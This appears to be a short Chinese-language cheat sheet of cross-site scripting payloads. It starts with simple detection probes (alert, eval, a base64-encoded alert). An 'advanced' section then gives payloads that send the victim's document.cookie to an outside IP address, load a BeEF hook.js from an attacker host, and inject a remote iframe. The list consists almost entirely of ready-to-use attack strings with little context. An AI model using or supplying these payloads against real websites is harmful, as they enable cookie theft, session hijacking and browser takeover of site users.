## xss 检测用 payload

<svg onload="eval('document.cookie')"//

<svg onload=alert(1)

<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>

## 进阶食用

<svg/onload=location='http://124.222.21.138:10086'>

<svg/onload=location='http://124.222.21.138:10086?cookie='+document.cookie;>

<script src="http://BeEF主机-IP:3000/hook.js"></script> // kali beef-xss test

<svg/onload=location='http://124.222.21.138:10086/hook.js'>

<svg/onload="var iframe = document.createElement('iframe');iframe.src = 'http://192.168.80.128:8888';document.body.appendChild(iframe);">   // 测试能否动态加载 js

